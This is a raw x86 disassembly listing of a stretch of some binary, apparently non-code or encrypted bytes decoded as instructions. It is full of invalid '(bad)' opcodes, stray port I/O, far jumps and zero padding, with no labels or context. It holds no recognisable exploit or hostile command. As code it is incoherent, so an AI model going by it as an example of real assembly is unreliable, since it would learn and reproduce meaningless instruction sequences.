  42647d:	int3   
  42647e:	mov    dh,0x4e
  426480:	cmp    ebx,DWORD PTR [esi-0xd]
  426483:	mov    dl,0xb8
  426485:	push   es
  426486:	xchg   esp,eax
  426487:	mov    cx,0x1059
  42648b:	loopne 0x42642d
  42648d:	cli    
  42648e:	jno    0x4264a9
  426490:	mov    ah,0xec
  426492:	push   edi
  426493:	and    BYTE PTR [eax+esi*8+0x4c1ded36],ah
  42649a:	jb     0x426502
  42649c:	xchg   ebp,eax
  42649d:	in     eax,0x51
  42649f:	daa    
  4264a0:	clc    
  4264a1:	fidivr DWORD PTR [ebx]
  4264a3:	cmp    eax,0x663bcfc7
  4264a8:	repz mov WORD PTR [ebx-0x113e3174],fs
  4264af:	xchg   BYTE PTR [ecx+0x236d2d8d],ah
  4264b5:	jmp    0x466c:0xa9977c55
  4264bc:	xchg   edx,eax
  4264bd:	loopne 0x426476
  4264bf:	add    esi,ecx
  4264c1:	cs push ss
  4264c3:	or     edi,DWORD PTR [esi-0x5a0874d1]
  4264c9:	pop    ecx
  4264ca:	icebp  
  4264cb:	mov    dl,0x3f
  4264cd:	and    ebx,0x1646ece9
  4264d3:	(bad)  
  4264d4:	mov    edi,ebx
  4264d6:	push   ebx
  4264d7:	inc    eax
  4264d8:	mov    eax,0x43bc15e7
  4264dd:	cli    
  4264de:	(bad)  [ecx]
  4264e0:	aam    0x1c
  4264e2:	aam    0x4d
  4264e4:	mov    WORD PTR [edx+0xa795a8d],?
  4264ea:	jnp    0x4264cd
  4264ec:	push   0xffffffc1
  4264ee:	ficom  DWORD PTR [eax]
  4264f0:	fidiv  WORD PTR [esi+0x4bf26948]
  4264f6:	shl    dh,0xca
  4264f9:	fwait
  4264fa:	iret   
  4264fb:	pop    edx
  4264fc:	push   0xfffffff9
  4264fe:	mov    dl,0x55
  426500:	loop   0x42653d
  426502:	imul   ebx,DWORD PTR [eax+edx*4],0x60
  426506:	mov    dl,0xc4
  426508:	out    0xda,eax
  42650a:	dec    edx
  42650b:	sub    BYTE PTR [edx],ah
  42650d:	loope  0x426583
  42650f:	and    BYTE PTR [esi],dl
  426511:	lds    esp,FWORD PTR [edi-0x6a]
  426514:	aam    0xc3
  426516:	cmp    ebp,ecx
  426518:	pusha  
  426519:	fisub  DWORD PTR [edi+edi*2+0x65]
  42651d:	rcl    BYTE PTR [ecx+ecx*8-0x135b1ea5],1
  426524:	push   sp
  426526:	sub    edx,eax
  426528:	test   dl,al
  42652a:	or     ch,dl
  42652c:	cmp    ch,ah
  42652e:	mov    ?,WORD PTR [ecx+0x33]
  426531:	pop    edi
  426532:	dec    esi
  426533:	js     0x4264c1
  426535:	mov    ds:0x4db33cc5,al
  42653a:	cdq    
  42653b:	in     eax,0xa7
  42653d:	adc    eax,0x56e067a1
  426542:	xchg   ebx,eax
  426543:	bound  ecx,QWORD PTR [eax-0x5701ac3]
  426549:	xor    eax,0xfb167c3c
  42654e:	loope  0x426577
  426550:	jge    0x426501
  426552:	mov    eax,ds:0x3a2a7f2a
  426557:	shl    DWORD PTR [edi-0x56],0xaf
  42655b:	dec    esi
  42655c:	(bad)  
  42655d:	mov    cl,dl
  42655f:	jbe    0x426579
  426561:	shl    ebx,1
  426563:	xchg   ch,al
  426565:	xchg   DWORD PTR gs:[ebx-0x21c91fb7],ecx
  42656c:	fcom   QWORD PTR [eax+0x0]
  42656f:	mov    DWORD PTR [eax+ecx*4],edx
  426572:	sahf   
  426573:	mov    dh,0xc6
  426575:	push   edx
  426576:	or     eax,0x5c08e544
  42657b:	in     eax,0xb9
  42657d:	div    DWORD PTR [ebx+0x6a108961]
  426583:	(bad)  
  426584:	in     eax,0xc
  426586:	ss and eax,0x8196dc67
  42658c:	scas   al,BYTE PTR es:[edi]
  42658d:	div    BYTE PTR [ecx]
	...
  426597:	add    BYTE PTR [eax],al
  426599:	add    BYTE PTR [ebp+0x4f3707c0],cl
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x426569
  4265a7:	rcr    esi,1
  4265a9:	imul   eax,DWORD PTR [ecx-0x2fffe24],0x1
  4265b0:	add    BYTE PTR [eax],al
  4265b2:	inc    eax
  4265b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265b4:	adc    eax,0xf87da130
  4265b9:	xor    eax,0x44e00dda
  4265be:	shr    DWORD PTR [ebp-0x7d],cl
  4265c1:	jecxz  0x42657f
  4265c3:	fwait
  4265c4:	dec    eax
  4265c5:	fnsave [edi+eiz*2]
  4265c8:	pop    esp
  4265c9:	lar    eax,WORD PTR [esi-0x72]
  4265cd:	sahf   
  4265ce:	outs   dx,BYTE PTR ds:[esi]
  4265d0:	lahf   
  4265d1:	fs inc esi
  4265d3:	out    dx,eax
  4265d4:	lea    ecx,[edi]
  4265d6:	sbb    eax,0x936fb42b
  4265db:	dec    ebx
  4265dc:	(bad)  
  4265de:	add    al,0xc8
  4265e0:	pop    esp
  4265e1:	int3   
  4265e2:	test   al,0xb1
  4265e4:	xor    DWORD PTR [ecx*1+0x2f62c25e],0x37
  4265ec:	(bad)  
  4265ed:	fisubr DWORD PTR [edi]
  4265ef:	xchg   edi,eax
  4265f0:	push   edx
  4265f1:	push   ecx
  4265f2:	ins    DWORD PTR es:[edi],dx
  4265f3:	inc    ebp
  4265f4:	cmp    dh,BYTE PTR [ebp+0x60]
  4265f7:	mov    cl,0xde
  4265f9:	popa   
  4265fa:	iret   
  4265fb:	xor    eax,0xd29e96cd
  426600:	inc    ebx
  426601:	(bad)  
  426602:	popf   
  426603:	sub    eax,0xecc9a86f
  426608:	inc    ebx
  426609:	fild   WORD PTR [eax]
  42660b:	sbb    edi,DWORD PTR [esi]
  42660d:	pop    ecx
  42660e:	lods   al,BYTE PTR ds:[esi]
  42660f:	test   eax,0x144cb897
  426614:	mov    BYTE PTR [ebp+0x67ee9413],dh
  42661a:	xchg   DWORD PTR [edx-0x68],ebp
  42661d:	pop    esp
  42661e:	adc    al,0x8b
  426620:	mov    ah,dh
  426622:	adc    esi,DWORD PTR [ebp+0x6a]
  426625:	push   0xffffffa9
  426627:	(bad)  
  426628:	idiv   DWORD PTR [eax]
  42662a:	jns    0x4265f3
  42662c:	cmc    
  42662d:	call   DWORD PTR [esp+eax*1]
  426630:	push   0xffffffd9
  426632:	ins    BYTE PTR es:[di],dx
  426634:	gs sbb bl,dl
  426637:	and    DWORD PTR [ecx-0x2dfb3765],eax
  42663d:	test   BYTE PTR [ecx+0x2],cl
  426640:	xchg   BYTE PTR [ebp*1-0x630524dc],bl
  426647:	hlt    
  426648:	jno    0x42668d
  42664a:	push   edi
  42664b:	jo     0x42669a
  42664d:	(bad)  [eax+0x3e]
  426650:	xor    ah,BYTE PTR [esi-0xa]
  426653:	ja     0x426667
  426655:	push   0xda6bc958
  42665a:	add    BYTE PTR [esi+0x20],ah
  42665d:	bnd ret 
  42665f:	pop    es
  426660:	sub    DWORD PTR [ebp+0x355fc7a],ecx
  426666:	ins    DWORD PTR es:[edi],dx
  426667:	cdq    
  426668:	xchg   edi,eax
  426669:	push   cs
  42666a:	add    eax,0x4dfd452e
  42666f:	ins    BYTE PTR es:[edi],dx
  426670:	inc    ecx
  426671:	test   DWORD PTR [eax],ebx
  426673:	in     eax,0xb6
  426675:	xchg   DWORD PTR [ebx+0x30],esi
  426678:	pop    ebp
  426679:	sti    
  42667a:	mov    dh,0x89
  42667c:	inc    esp
  42667d:	ret    
  42667e:	test   eax,0xc97b3796
  426683:	enter  0x7591,0x13
  426687:	js     0x426610
  426689:	fbstp  TBYTE PTR [ecx]
  42668b:	dec    edi
  42668c:	popf   
  42668d:	add    BYTE PTR [edx-0x2c],ah
  426690:	inc    ebx
  426691:	inc    ebp
  426692:	fisub  WORD PTR [edx]
  426694:	ss cld 
  426696:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  426698:	data16 sbb BYTE PTR [ecx+edi*1],0x5f
  42669d:	mov    eax,0x1f1771b
  4266a2:	dec    eax
  4266a3:	idiv   dl
  4266a5:	push   esi
  4266a6:	fwait
  4266a7:	push   ebx
  4266a8:	std    
  4266a9:	xor    eax,0x528517f8
  4266ae:	and    bl,BYTE PTR [edx-0x625da882]
  4266b4:	jno    0x4266ef
  4266b6:	loopne 0x426651
  4266b8:	outs   dx,BYTE PTR ds:[esi]
  4266b9:	aad    0x46
  4266bb:	jns    0x4266b4
  4266bd:	mov    al,ds:0xd1304d51
  4266c2:	mov    esp,0xa5648d77
  4266c7:	fisubr WORD PTR [edx-0x7c]
  4266ca:	les    edx,FWORD PTR [ebx+0xe]
  4266cd:	mov    ds:0x6726750e,al
  4266d2:	jl     0x426730
  4266d4:	and    al,0x69
  4266d6:	ret    0x454a
  4266d9:	repz gs int3 
  4266dc:	push   esp
  4266dd:	std    
  4266de:	dec    esi
  4266df:	xchg   esp,eax
  4266e0:	add    eax,DWORD PTR [edi]
  4266e2:	pop    ebp
  4266e3:	or     al,0xb2
  4266e5:	pop    ebx
  4266e6:	or     ebp,0xffffff8b
  4266e9:	xlat   BYTE PTR ds:[ebx]
  4266ea:	test   al,0xc
  4266ec:	inc    esi
  4266ed:	xchg   ebp,eax
  4266ee:	push   es
  4266ef:	dec    ecx
  4266f0:	push   edx
  4266f1:	mul    esp
  4266f3:	int3   
  4266f4:	(bad)  
  4266f5:	xchg   edi,eax
  4266f6:	xor    al,0x1e
  4266f8:	loop   0x4266d9
  4266fa:	push   0xb465e05b
  4266ff:	xor    cl,BYTE PTR [eax+0x31cd8f90]
  426705:	xchg   esi,eax
  426706:	lahf   
  426707:	or     ecx,eax
  426709:	stos   DWORD PTR es:[edi],eax
  42670a:	sbb    eax,0x8e17afde
  42670f:	sahf   
  426710:	mov    ds:0xaef4b076,eax
  426715:	push   eax
  426716:	or     eax,0xb0ce58a
  42671b:	jmp    0x4266ad
  42671d:	jns    0x426742
  42671f:	mov    eax,ds:0xac474d8a
  426724:	add    BYTE PTR [edx+0x3ac7dd31],bh
  42672a:	mov    ds:0xdaa9253c,al
  42672f:	mov    ebp,0xce11556b
  426734:	xchg   ebp,eax
  426735:	lods   eax,DWORD PTR ds:[esi]
  426736:	xchg   ebx,eax
  426737:	mov    ebx,0xb902275d
  42673c:	fcomp  DWORD PTR [esi-0x21e88da0]
  426742:	or     eax,0xd0d3f58e
  426747:	and    al,0xc2
  426749:	adc    BYTE PTR [esi+0x7387bb17],0xd6
  426750:	popa   
  426751:	fstp   DWORD PTR [ebp+0x31]
  426754:	push   es
  426755:	stos   BYTE PTR es:[edi],al
  426756:	jbe    0x426743
  426758:	xor    al,0x4d
  42675a:	(bad)  ds:0x8443ded
  426760:	andnps xmm0,XMMWORD PTR ds:0x9a25be17
  426767:	(bad)  
  426768:	dec    edi
  426769:	adc    al,0x92
  42676b:	pop    edi
  42676c:	sub    esi,eax
  42676e:	cmc    
  42676f:	test   al,0x4b
  426771:	add    al,BYTE PTR ds:0xe7a1338a
  426777:	sub    eax,0x5391f782
  42677c:	lahf   
  42677d:	stos   DWORD PTR es:[edi],eax
  42677e:	sub    eax,0xf84e451b
  426783:	cmp    eax,0xbe6d3375
  426788:	aad    0x94
  42678a:	dec    esi
  42678b:	mov    edx,ecx
  42678d:	pop    eax
  42678e:	inc    edi
  42678f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426790:	adc    al,0xca
  426792:	pop    ds
  426793:	and    esi,DWORD PTR [esi]
  426795:	in     eax,dx
  426796:	dec    ebx
  426797:	data16 jns 0x42672b
  42679a:	xchg   ebp,eax
  42679b:	xchg   esp,eax
  42679c:	mov    DWORD PTR [eax+0x52],0xf67d24dc
  4267a3:	(bad)  
  4267a4:	adc    al,0x19
  4267a6:	movhps xmm7,QWORD PTR ds:0xc2318bfd
  4267ad:	stos   DWORD PTR es:[edi],eax
  4267ae:	pop    ss
	...
  4267b7:	add    BYTE PTR [eax],al
  4267b9:	add    BYTE PTR [eax-0x57e1776],dh
  4267bf:	jecxz  0x4267ba
  4267c1:	mov    ebx,0xcae72888
  4267c6:	mov    ebx,0x7e832357
  4267cb:	fiadd  WORD PTR [ecx]
  4267cd:	add    ch,bh
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    BYTE PTR [ecx+0x65],cl
  4267d4:	jge    0x4267cc
  4267d6:	sbb    dh,BYTE PTR [eax+0x6]
  4267d9:	mov    es,WORD PTR [edx+esi*1+0x36a8a93b]
  4267e0:	add    bh,BYTE PTR [ecx]
  4267e2:	pop    edi
  4267e3:	sub    cl,BYTE PTR [eax+0x2f]
  4267e6:	push   ebp
  4267e7:	sub    al,0x3c
  4267e9:	xchg   edi,eax
  4267ea:	nop
  4267eb:	mov    eax,ds:0xd368ccac
  4267f0:	popf   
  4267f1:	adc    edi,DWORD PTR [ebp-0x4bf2c737]
  4267f7:	cdq    
  4267f8:	push   cs
  4267f9:	and    eax,DWORD PTR [ebp+0x8f9232e]
  4267ff:	pop    ebp
  426800:	cmc    
  426801:	call   0x3fd6a292
  426806:	frstor [ecx+0x34f5e4e5]
  42680c:	xor    al,BYTE PTR [ebx-0x7f7e19ba]
  426812:	js     0x4267e8
  426814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426815:	dec    edx
  426816:	test   eax,0xfdce7882
  42681b:	dec    eax
  42681c:	stos   DWORD PTR es:[edi],eax
  42681d:	int3   
  42681e:	cwde   
  42681f:	jne    0x426865
  426821:	adc    DWORD PTR [ebp+0x23],0xffffffef
  426825:	push   edi
  426826:	data16 aad 0x8e
  426829:	adc    ah,cl
  42682b:	mov    ah,0x27
  42682d:	cmp    eax,0x4e14a779
  426832:	sahf   
  426833:	std    
  426834:	les    esp,FWORD PTR ds:0x7987febb
  42683a:	idiv   eax
  42683c:	nop
  42683d:	jb     0x42680e
  42683f:	mov    bl,0x10
  426841:	jmp    0x1e2e:0x7b75167e
  426848:	test   al,0x90
  42684a:	and    ecx,DWORD PTR [esi]
  42684c:	mov    ebp,0xec00d7ff
  426851:	jmp    0x426812
  426853:	mov    eax,0x2dfaff5e
  426858:	mov    bh,0xdf
  42685a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42685b:	xchg   esp,eax
  42685c:	ficomp WORD PTR [esi-0x78]
  42685f:	cli    
  426860:	enter  0xb320,0x99
  426864:	ss push ebx
  426866:	mov    bl,0x92
  426868:	loopne 0x42680b
  42686a:	(bad)  
  42686b:	ins    DWORD PTR es:[edi],dx
  42686c:	add    ebp,DWORD PTR [edx]
  42686e:	mov    al,ds:0xae1ecf77
  426873:	std    
  426874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426875:	jno    0x426889
  426877:	int    0xb8
  426879:	mov    esi,ds
  42687b:	or     esi,DWORD PTR [edi-0x6e611595]
  426881:	scas   al,BYTE PTR es:[edi]
  426882:	out    0x79,eax
  426884:	(bad)  
  426886:	inc    edi
  426887:	(bad)  
  426888:	mov    ebp,0xb7637a6d
  42688d:	sahf   
  42688e:	in     al,0x60
  426890:	out    dx,eax
  426891:	cwde   
  426892:	idiv   DWORD PTR fs:[esi+0x74]
  426896:	push   ecx
  426897:	mov    ah,0x2e
  426899:	inc    esi
  42689a:	in     al,dx
  42689b:	outs   dx,DWORD PTR ds:[si]
  42689d:	xchg   BYTE PTR [edi-0x59],cl
  4268a0:	(bad)  
  4268a1:	fsubr  st,st(4)
  4268a3:	fisttp DWORD PTR [ebx]
  4268a5:	lods   al,BYTE PTR ds:[esi]
  4268a6:	out    dx,eax
  4268a7:	or     eax,0xbac9aaed
  4268ac:	(bad)  
  4268ad:	gs mov esp,0x4ac74fd2
  4268b3:	lock ja 0x426865
  4268b6:	inc    ecx
  4268b7:	jo     0x4268af
  4268b9:	inc    esp
  4268ba:	mov    ds:0x6b676967,al
  4268bf:	cli    
  4268c0:	xor    esp,DWORD PTR [ebp-0x2540d926]
  4268c6:	js     0x42692a
  4268c8:	xor    eax,0x57eb51a7
  4268cd:	leave  
  4268ce:	xchg   ebx,eax
  4268cf:	ucomiss xmm6,DWORD PTR [ebp+ebp*4-0x5a]
  4268d4:	push   ds
  4268d5:	rcl    BYTE PTR [edi],1
  4268d7:	inc    edi
  4268d8:	int3   
  4268d9:	sbb    ah,dl
  4268db:	lods   al,BYTE PTR ds:[esi]
  4268dc:	loope  0x42690b
  4268de:	sahf   
  4268df:	jbe    0x4268e1
  4268e1:	dec    edi
  4268e2:	sar    BYTE PTR [eax],cl
  4268e4:	aaa    
  4268e5:	mov    eax,ds:0x73b995a3
  4268ea:	shr    BYTE PTR [ecx+edi*1],1
  4268ed:	dec    edi
  4268ee:	in     al,dx
  4268ef:	aam    0xc2
  4268f1:	xlat   BYTE PTR ds:[ebx]
  4268f2:	mov    esi,DWORD PTR [eax+ebx*2]
  4268f5:	or     esi,DWORD PTR [ecx-0x72]
  4268f8:	sbb    bh,BYTE PTR [eax*2-0x197e4c8d]
  4268ff:	push   0x69
  426901:	in     eax,dx
  426902:	sbb    cl,BYTE PTR [esi-0x3f]
  426905:	cwde   
  426906:	lods   al,BYTE PTR ds:[esi]
  426907:	popf   
  426908:	adc    BYTE PTR [ebp-0x4b],dh
  42690b:	repz sbb edi,DWORD PTR [eax+ebp*8+0x7b]
  426910:	pop    ebx
  426911:	push   edi
  426912:	jge    0x426983
  426914:	stos   DWORD PTR es:[edi],eax
  426915:	out    dx,al
  426916:	add    dh,BYTE PTR [eax-0x62c170e5]
  42691c:	jno    0x4268ee
  42691e:	or     eax,DWORD PTR [ebp+0x20]
  426921:	cs not BYTE PTR ss:[edx+eax*8]
  426926:	js     0x42696e
  426928:	mov    fs,WORD PTR [edx]
  42692a:	imul   edi,eax,0x32
  42692d:	and    al,0xd7
  42692f:	xor    esi,ebp
  426931:	jmp    0x102849b
  426936:	jl     0x426978
  426938:	adc    edi,esi
  42693a:	xchg   ecx,eax
  42693b:	les    esi,FWORD PTR [edi+eiz*8]
  42693e:	sub    DWORD PTR [ebx-0x43],edx
  426941:	push   0x2d7db5a3
  426946:	add    al,0x5a
  426948:	push   edx
  426949:	ins    BYTE PTR es:[edi],dx
  42694a:	aaa    
  42694b:	jno    0x4268ff
  42694d:	xor    al,0xbe
  42694f:	mov    ds:0x2a53a9aa,al
  426954:	pop    ebx
  426955:	sar    al,0xbc
  426958:	loope  0x42699c
  42695a:	lods   al,BYTE PTR ds:[esi]
  42695b:	aas    
  42695c:	xor    BYTE PTR [eax+0x30],ch
  42695f:	cld    
  426960:	mov    ecx,0x8d1d05df
  426965:	fcom   QWORD PTR [ebx-0x3f]
  426968:	call   0x2e4e1cd5
  42696d:	sub    BYTE PTR [edx-0x6aa1120e],dl
  426973:	fcomip st,st(1)
  426975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426976:	pop    ebx
  426977:	outs   dx,DWORD PTR ds:[esi]
  426978:	in     eax,dx
  426979:	pop    ebp
  42697a:	in     al,dx
  42697b:	in     al,dx
  42697c:	mov    DWORD PTR [edi],edi
  42697e:	call   FWORD PTR [edx]
  426980:	shr    BYTE PTR [ebp+0x6d],cl
  426983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426984:	daa    
  426985:	or     BYTE PTR [edx+ebx*1],0x75
  426989:	mul    BYTE PTR es:[edi+0x2deccbc4]
  426990:	test   BYTE PTR [ebx-0x62],dh
  426993:	or     eax,0x4b7a4f05
  426998:	mov    dh,0x59
  42699a:	dec    ebx
  42699b:	xor    al,0xe7
  42699d:	mov    dh,0x15
  42699f:	std    
  4269a0:	inc    edx
  4269a1:	dec    edi
  4269a2:	pop    ds
  4269a3:	mov    edi,0x5deb8fce
  4269a8:	mov    ecx,0xd5babcf7
  4269ad:	nop
  4269ae:	ins    DWORD PTR es:[edi],dx
  4269af:	jp     0x426938
  4269b1:	sub    al,0xdc
  4269b3:	cs inc esi
  4269b5:	push   ds
  4269b6:	mov    edx,0xd0376de6
  4269bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269bc:	xlat   BYTE PTR ds:[ebx]
  4269bd:	mov    ah,0xff
  4269bf:	add    DWORD PTR [esi+0x31],0xf0e5a8bf
  4269c6:	pop    ss
  4269c7:	jo     0x426950
  4269c9:	cmp    cl,BYTE PTR [edx]
  4269cb:	xchg   esp,eax
  4269cc:	cs inc ebx
  4269ce:	xchg   esi,eax
	...
  4269d7:	add    BYTE PTR [eax],al
  4269d9:	add    BYTE PTR [edx-0x39253b74],cl
  4269df:	ficomp DWORD PTR [esi+0xc235fdc]
  4269e5:	mov    bh,BYTE PTR [ecx+0x7b7581e0]
  4269eb:	loopne 0x4269ee
  4269ed:	add    ch,bh
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    BYTE PTR [eax+0x12570a11],ch
  4269f7:	repz pop ds
  4269f9:	bnd jae 0x4269e1
  4269fc:	sbb    DWORD PTR [esp+esi*8+0x59],0xa3b7ade9
  426a04:	ret    
  426a05:	imul   eax,DWORD PTR [edi+0x832e283],0x6b
  426a0c:	lods   al,BYTE PTR ds:[esi]
  426a0d:	ins    DWORD PTR es:[edi],dx
  426a0e:	mov    eax,DWORD PTR [edx+0x6]
  426a11:	in     eax,0x84
  426a13:	aas    
  426a14:	sar    DWORD PTR [ebp+0x46],1
  426a17:	push   0x63
  426a19:	aad    0x96
  426a1b:	addr16 test eax,0x9861d046
  426a21:	inc    esi
  426a22:	mov    es,WORD PTR [ecx-0x64fe55a2]
  426a28:	out    dx,eax
  426a29:	xchg   cl,ch
  426a2b:	xchg   esi,eax
  426a2c:	push   ebp
  426a2d:	dec    ecx
  426a2e:	mov    ebx,0x333049bc
  426a33:	push   ds
  426a34:	adc    BYTE PTR [esp+eax*4+0xb],dh
  426a38:	add    DWORD PTR [esi-0x61],ecx
  426a3b:	gs std 
  426a3d:	add    edx,DWORD PTR [edi+0x7a21b8b2]
  426a43:	sub    DWORD PTR [ecx+0x50],ebx
  426a46:	int3   
  426a47:	in     eax,0x11
  426a49:	push   cs
  426a4a:	jae    0x426a01
  426a4c:	popf   
  426a4d:	pushf  
  426a4e:	rcr    BYTE PTR [ecx+0x58747998],cl
  426a54:	mov    edi,0x284ab1d7
  426a59:	test   al,0xd4
  426a5b:	push   ebx
  426a5c:	jg     0x426a5c
  426a5e:	leave  
  426a5f:	mov    ch,0xc4
  426a61:	dec    ebp
  426a62:	call   0x3763:0x73ee3d14
  426a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a6a:	adc    bh,BYTE PTR [ecx+0x6c]
  426a6d:	loop   0x426a3e
  426a6f:	(bad)  
  426a70:	icebp  
  426a71:	(bad)  
  426a72:	imul   esp,DWORD PTR [esi],0xefcfbdde
  426a78:	cs dec ecx
  426a7a:	sub    esp,DWORD PTR [edi-0x3a39502d]
  426a80:	sub    ah,BYTE PTR [edi+0x146f8cd9]
  426a86:	adc    BYTE PTR ds:0x84d5e5a3,0xb
  426a8d:	dec    ebx
  426a8e:	cmp    DWORD PTR [eax],esi
  426a90:	shl    DWORD PTR [ebp+0x4e070fd3],0xfe
  426a97:	loopne 0x426a77
  426a99:	mov    edi,DWORD PTR [ebx+0x4aea7a44]
  426a9f:	push   edx
  426aa0:	adc    bh,dl
  426aa2:	retf   
  426aa3:	xor    cl,ch
  426aa5:	sub    cl,ah
  426aa7:	push   edx
  426aa8:	or     eax,0x3a71ecc7
  426aad:	test   cl,bl
  426aaf:	mov    esp,0x5b0a342d
  426ab4:	mov    ds,WORD PTR [esi-0x6c]
  426ab7:	ss pusha 
  426ab9:	sub    ecx,DWORD PTR [esi+ecx*1]
  426abc:	pop    ss
  426abd:	out    dx,al
  426abe:	pop    es
  426abf:	dec    edi
  426ac0:	(bad)  
  426ac1:	mov    dl,0xbc
  426ac3:	rcr    DWORD PTR [ebx],1
  426ac5:	xchg   edx,eax
  426ac6:	or     bh,BYTE PTR [edx-0x7ede4a8b]
  426acc:	cli    
  426acd:	into   
  426ace:	inc    esi
  426acf:	fs and ah,dl
  426ad2:	lahf   
  426ad3:	(bad)  [edx]
  426ad5:	sub    eax,0x7139d2b7
  426ada:	cmc    
  426adb:	dec    edi
  426adc:	sar    eax,0xd7
  426adf:	or     BYTE PTR [ecx],bl
  426ae1:	or     BYTE PTR [eax-0x649f635a],dl
  426ae7:	sbb    DWORD PTR [esi-0x10],ecx
  426aea:	xor    BYTE PTR [edi],bl
  426aec:	or     dh,BYTE PTR [eax-0x22fcb8c2]
  426af2:	push   esi
  426af3:	stos   BYTE PTR es:[edi],al
  426af4:	sar    BYTE PTR [ecx+0x1b7280e9],cl
  426afa:	xchg   ecx,eax
  426afb:	sti    
  426afc:	ds call 0xe205ad74
  426b02:	jae    0x426b03
  426b04:	ret    0x5012
  426b07:	cmp    BYTE PTR [edx+ebx*8],0x79
  426b0b:	pop    edx
  426b0c:	sti    
  426b0d:	cld    
  426b0e:	add    dh,ah
  426b10:	pushf  
  426b11:	xchg   ebp,eax
  426b12:	push   eax
  426b13:	mov    ebp,0xfb224589
  426b18:	mov    edx,0xee543d62
  426b1d:	pop    esp
  426b1e:	test   al,0xb8
  426b20:	retf   0xbaa7
  426b23:	fst    DWORD PTR [esi+0x3256aa75]
  426b29:	cwde   
  426b2a:	sbb    BYTE PTR [eax+0x13],bh
  426b2d:	sti    
  426b2e:	cdq    
  426b2f:	adc    dh,0x58
  426b32:	cmp    al,0xe6
  426b34:	ret    0x6d57
  426b37:	ja     0x426afe
  426b39:	xor    DWORD PTR [eax+0x1b],edx
  426b3c:	arpl   WORD PTR [ecx+0x37661af3],dx
  426b42:	imul   eax,DWORD PTR [ebx+eiz*1-0x728fc650],0x65
  426b4a:	or     al,0x5f
  426b4c:	mov    ecx,DWORD PTR [ebx+0x318a84f8]
  426b52:	neg    DWORD PTR [edi-0x6a]
  426b55:	enter  0x996,0xf5
  426b59:	out    0x6,eax
  426b5b:	sbb    dl,bh
  426b5d:	loopne 0x426b9f
  426b5f:	push   es
  426b60:	sbb    DWORD PTR [ebp-0x52],edx
  426b63:	cmc    
  426b64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b65:	mov    al,0xf9
  426b67:	dec    ebx
  426b68:	push   0x6a6516fe
  426b6d:	or     eax,0x6248f339
  426b72:	cmp    eax,0x3f9dd486
  426b77:	repnz (bad) 
  426b79:	mov    ebp,0xd0954edf
  426b7e:	mov    ds:0x62c32c67,al
  426b83:	xchg   DWORD PTR [esi],esp
  426b85:	or     eax,0xa4897685
  426b8a:	jg     0x426bbd
  426b8c:	clc    
  426b8d:	mov    edi,0x71775d0e
  426b92:	mov    ebx,ebp
  426b94:	dec    ecx
  426b95:	jno    0x426bda
  426b97:	fsubr  st(4),st
  426b99:	xor    BYTE PTR [esi+edi*8+0x14],ch
  426b9d:	jbe    0x426b5b
  426b9f:	test   dl,cl
  426ba1:	ins    BYTE PTR es:[edi],dx
  426ba2:	or     eax,0xe689244e
  426ba7:	outs   dx,BYTE PTR cs:[esi]
  426ba9:	inc    ebx
  426baa:	popf   
  426bab:	push   esp
  426bac:	popf   
  426bad:	inc    ebx
  426bae:	sub    dl,BYTE PTR [ecx+0x7437b4a6]
  426bb4:	cmp    eax,0xa26b33e4
  426bb9:	clc    
  426bba:	ret    
  426bbb:	jb     0x426c06
  426bbd:	aam    0x11
  426bbf:	fmul   st,st(6)
  426bc1:	jae    0x426b9b
  426bc3:	dec    ecx
  426bc4:	(bad)  
  426bc5:	cmp    DWORD PTR [edi-0x60],ebp
  426bc8:	std    
  426bc9:	(bad)  
  426bca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bcb:	or     al,0xd5
  426bcd:	(bad)  
  426bce:	or     dl,BYTE PTR [edi+ebx*4]
  426bd1:	fsub   QWORD PTR [ecx]
  426bd3:	iret   
  426bd4:	jl     0x426bbf
  426bd6:	jne    0x426b93
  426bd8:	outs   dx,BYTE PTR ds:[esi]
  426bd9:	imul   eax,DWORD PTR ds:0x13ee5be4,0xcb872d1a
  426be3:	xor    dh,0x9a
  426be6:	lahf   
  426be7:	(bad)  
  426be8:	das    
  426be9:	push   ds
  426bea:	cmp    eax,edx
  426bec:	loop   0x426b7c
  426bee:	cmp    BYTE PTR [eax],al
	...
  426bf8:	add    BYTE PTR [eax],al
  426bfa:	inc    eax
  426bfb:	stos   BYTE PTR es:[edi],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0xaefe433f,al
  426c07:	inc    eax
  426c08:	mov    dh,0x75
  426c0a:	js     0x426bee
  426c0c:	add    DWORD PTR [eax],eax
  426c0e:	std    
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [ebx],ah
  426c13:	mov    cl,0x14
  426c15:	add    bl,dl
  426c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c18:	leave  
  426c19:	in     al,0xcd
  426c1b:	pop    ss
  426c1c:	jbe    0x426c7c
  426c1e:	mov    ds:0x527b8fb7,eax
  426c23:	out    dx,al
  426c24:	loopne 0x426bed
  426c26:	mov    ds:0x4280c3e8,al
  426c2b:	fistp  QWORD PTR fs:[edi-0x3c3afea4]
  426c32:	push   eax
  426c33:	iret   
  426c34:	(bad)  
  426c36:	mov    ecx,0x34ae2603
  426c3b:	push   ebp
  426c3c:	xchg   BYTE PTR [ecx],dh
  426c3e:	add    esp,DWORD PTR [edi-0x38e56bad]
  426c44:	popw   ds
  426c46:	leave  
  426c47:	lods   al,BYTE PTR ds:[esi]
  426c48:	cmp    DWORD PTR [ecx],edi
  426c4a:	mov    ds:0xd2acbccc,eax
  426c4f:	inc    ebp
  426c50:	mov    ecx,0x4e2e8a36
